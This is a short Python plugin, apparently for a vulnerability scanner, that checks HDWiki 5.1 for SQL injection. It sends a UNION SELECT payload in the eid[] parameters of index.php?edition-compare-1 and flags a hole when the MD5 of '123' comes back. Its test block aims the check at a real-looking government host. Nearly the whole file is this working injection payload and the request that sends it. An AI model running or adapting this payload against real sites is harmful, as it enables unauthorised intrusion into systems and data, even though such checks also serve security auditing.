#/usr/bin/python
#-*- coding: utf-8 -*-
#Refer http://0day5.com/archives/2978
#__Author__ = Mr.R
#_PlugName_ = hdwiki5.1_sql Plugin
#_FileName_ = hdwiki5.1_sql.py


def assign(service, arg):
  if service == 'hdwiki':
      return True, arg    

def audit(arg):
  url=arg+'index.php?edition-compare-1'
  post_data_test=' "eid[0]=2&eid[1]=19&eid[2]=-3) UNION SELECT 1,2,35,4,5,6,7,8,9,10,11,12,md5(123),14,15,16,17,18,19 %23" '
  code,head,body,errcode,fina_url=curl.curl('-d'+post_data_test+url)
  if code == 200 and '202cb962ac59075b964b07152d234b70' in body :
    security_hole(url)

if __name__ == '__main__':
  from dummy import *
  audit(assign('hdwiki', 'http://test1.mas.gov.cn/')[1])